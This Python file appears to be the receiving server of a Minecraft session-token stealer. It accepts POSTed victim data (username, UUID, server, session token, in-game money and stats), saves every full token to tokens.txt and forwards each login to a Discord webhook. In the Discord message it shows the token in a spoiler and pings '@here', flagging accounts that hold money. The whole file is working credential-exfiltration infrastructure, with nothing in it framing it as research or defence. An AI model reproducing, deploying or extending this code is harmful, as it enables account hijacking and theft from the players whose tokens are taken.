from http.server import HTTPServer, BaseHTTPRequestHandler
import json
import urllib.request
import urllib.error
import os

# Load configuration from config.json
def load_config():
    try:
        with open('config.json', 'r') as f:
            config = json.load(f)
            return config
    except FileNotFoundError:
        print("❌ ERROR: config.json not found!")
        print("Create config.json with your webhook first!")
        exit(1)
    except json.JSONDecodeError:
        print("❌ ERROR: Invalid config.json!")
        exit(1)

# Load config
config = load_config()
DISCORD_WEBHOOK = config.get('discord_webhook')

if not DISCORD_WEBHOOK:
    print("❌ ERROR: discord_webhook not found in config.json!")
    exit(1)

print(f"✅ Config loaded: Webhook length = {len(DISCORD_WEBHOOK)} chars")

class Handler(BaseHTTPRequestHandler):
    def do_POST(self):
        try:
            length = int(self.headers['Content-Length'])
            data = json.loads(self.rfile.read(length).decode())
            
            # Get ALL fields with proper defaults
            username = data.get('username', 'Unknown').strip()
            uuid = data.get('uuid', '').strip()
            server = data.get('server', '').strip()
            token = data.get('token', '').strip()
            money = data.get('money', '0').strip()
            playtime = data.get('playtime', '0h').strip()
            kills = data.get('kills', '0').strip()
            deaths = data.get('deaths', '0').strip()
            skin = data.get('skin', '').strip()
            log_type = data.get('type', 'login').strip()
            
            print(f"Got: {username} on {server}")
            print(f"Token length: {len(token)} chars")
            
            # Save to file
            with open('tokens.txt', 'a') as f:
                # Save FULL token to file
                f.write(f"{username} | {uuid} | {server} | {token} | {money} | {playtime} | {kills} | {deaths}\n")
            
            # Send to Discord
            try:
                headers = {
                    'Content-Type': 'application/json',
                    'User-Agent': 'Mozilla/5.0'
                }
                
                # Determine if it's a login
                is_login = log_type.lower() == "login"
                
                # Build description
                description_parts = [
                    f"**Username:** `{username}`",
                    f"**UUID:** `{uuid}`",
                    f"**Server:** `{server}`"
                ]
                
                # Add optional stats
                if money and money != "0":
                    description_parts.append(f"**Money:** `{money}`")
                if playtime and playtime != "0h":
                    description_parts.append(f"**Playtime:** `{playtime}`")
                if kills and kills != "0":
                    description_parts.append(f"**Kills:** `{kills}`")
                if deaths and deaths != "0":
                    description_parts.append(f"**Deaths:** `{deaths}`")
                
                # Add token in spoiler if it's a login
                if is_login and token:
                    description_parts.append(f"\n🔑 **Session Token:**\n||`{token}`||")
                
                description = "\n".join(description_parts)
                
                # Create embed
                embed = {
                    "title": "✅ User Connected" if is_login else "❌ User Disconnected",
                    "color": 5763719 if is_login else 15548997,
                    "description": description
                }
                
                # Add skin/thumbnail if available
                if skin:
                    embed["thumbnail"] = {"url": skin}
                elif uuid:
                    embed["thumbnail"] = {"url": f"https://mc-heads.net/head/{uuid.replace('-', '')}"}
                
                # Build content message
                content = None
                if is_login:
                    if money and money != "0":
                        content = f"@here Money: ||{money}||"
                    else:
                        content = "@here"
                
                # Create final payload
                payload = {
                    "content": content,
                    "embeds": [embed],
                    "allowed_mentions": {
                        "parse": ["everyone", "roles", "users"]
                    }
                }
                
                # Send to Discord
                req_data = json.dumps(payload).encode('utf-8')
                req = urllib.request.Request(DISCORD_WEBHOOK, data=req_data, headers=headers)
                response = urllib.request.urlopen(req, timeout=10)
                print(f"✅ Sent to Discord: Status {response.status}")
                
            except urllib.error.HTTPError as e:
                print(f"❌ Discord HTTP error: {e.code} - {e.reason}")
                try:
                    error_body = e.read().decode('utf-8')
                    print(f"Error details: {error_body[:500]}")
                    
                    if e.code == 400 and len(token) > 4000:
                        print("⚠️ Token might be too long for Discord")
                        embed["description"] = embed["description"].replace(f"\n🔑 **Session Token:**\n||`{token}`||", 
                                                                          "\n🔑 **Session Token:** *(too long for Discord, saved to file)*")
                        payload["embeds"] = [embed]
                        req_data = json.dumps(payload).encode('utf-8')
                        req = urllib.request.Request(DISCORD_WEBHOOK, data=req_data, headers=headers)
                        urllib.request.urlopen(req, timeout=10)
                        print("✅ Sent fallback message to Discord")
                except Exception as e2:
                    print(f"Failed to handle error: {e2}")
                    
            except Exception as e:
                print(f"❌ Discord error: {type(e).__name__}: {e}")
            
            self.send_response(200)
            self.end_headers()
            self.wfile.write(b'OK')
            
        except json.JSONDecodeError as e:
            print(f"❌ JSON decode error: {e}")
            self.send_response(400)
            self.end_headers()
            self.wfile.write(b'Invalid JSON')
        except Exception as e:
            print(f"❌ Server error: {type(e).__name__}: {e}")
            import traceback
            traceback.print_exc()
            self.send_response(500)
            self.end_headers()
    
    def do_GET(self):
        self.send_response(200)
        self.end_headers()
        self.wfile.write(b'Server running')
    
    def log_message(self, format, *args):
        pass

print("🚀 Server starting on port 5000")
server = HTTPServer(('0.0.0.0', 5000), Handler)
server.serve_forever()
